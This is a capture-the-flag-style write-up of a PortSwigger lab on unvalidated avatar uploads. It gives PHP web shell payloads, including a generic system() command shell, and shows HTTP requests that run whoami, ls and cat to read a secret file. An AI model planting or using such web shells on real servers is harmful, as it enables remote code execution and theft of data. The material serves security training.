
# #PortSwigger 


![[Pasted image 20251215191946.png]]


## Lab Description

> This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
> 
> **Objective:** Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> - **Your credentials:** `wiener:peter`

---
---

## Step 1: Understanding the Vulnerability

**The vulnerability:**
- The image upload function performs **no validation** on uploaded files
- Any file type can be uploaded (no MIME type check, no extension validation, no magic bytes check)
- Uploaded files are stored directly in `/files/avatars/`
- PHP files are executed when accessed

**The attack:**
1. Create a PHP web shell
2. Upload it as an avatar
3. Access the uploaded file via browser
4. Execute commands to read Carlos's secret

---

## Step 2: Reconnaissance

### Step 2.1: Log In

1. Log in with `wiener:peter`
2. Go to **My account** page

### Step 2.2: Observe Avatar Upload

Notice the **Avatar** upload feature:

- Choose File -> Upload
- No restrictions visible



UPload Photo
![[Pasted image 20251215192003.png]]

---

## Step 3: Creating the PHP Web Shell

### Step 3.1: Basic Payload

Create a file named `shell.php`:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Step 3.2: Alternative Payload (System Command)

For more flexibility (used in your screenshots):
```
<?php system($_GET['command']); ?>
```

This allows executing arbitrary commands via the `command` parameter.

---

## Step 4: Uploading the Web Shell

### Step 4.1: Upload

1. Click **Choose File** -> Select `shell.php`
2. Click **Upload**

**Response**
```
The file avatars/shell.php has been uploaded.
```

![[Pasted image 20251215192108.png]]

Upload successful! No validation was performed.

### Step 4.2: Find the File Path

From the response, the file is stored at:
```
/files/avatars/shell.php
```

Full URL:
```
https://YOUR-LAB-ID.web-security-academy.net/files/avatars/shell.php
```



![[Pasted image 20251215192558.png]]

---

## Step 5: Executing the Web Shell

### Step 5.1: Test with whoami

Access the uploaded shell with a command parameter:
```
GET /files/avatars/shell.php?command=whoami HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**Response**
```
carlos
```

![[Pasted image 20251215192818.png]]

The web shell works! The server is running as user `carlos`.

### Step 5.2: List Home Directory

```
GET /files/avatars/shell.php?command=ls%20/home/carlos HTTP/1.1
```

**Response**
```
secret
```

![[Pasted image 20251215193415.png]]

The file `secret` exists in `/home/carlos/`.

### Step 5.3: Read the Secret

```
GET /files/avatars/shell.php?command=cat%20/home/carlos/secret HTTP/1.1
```

**Response(like as):**
```
ZzX34Xqke7pozmolecS2ZLvPwLYo6hHY
```

![[Pasted image 20251215193456.png]]

- *That's Carlos's secret!

---

## Step 6: Submitting the Secret

1. Go back to the lab page
2. Click **Submit solution** (button in the lab banner)
3. Enter the secret: `ZzX34Xqke7pozmolecS2ZLvPwLYo6hHY`
4. Click **OK**

![[Pasted image 20251215193537.png]]


---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20251215195126.png]]

---
---
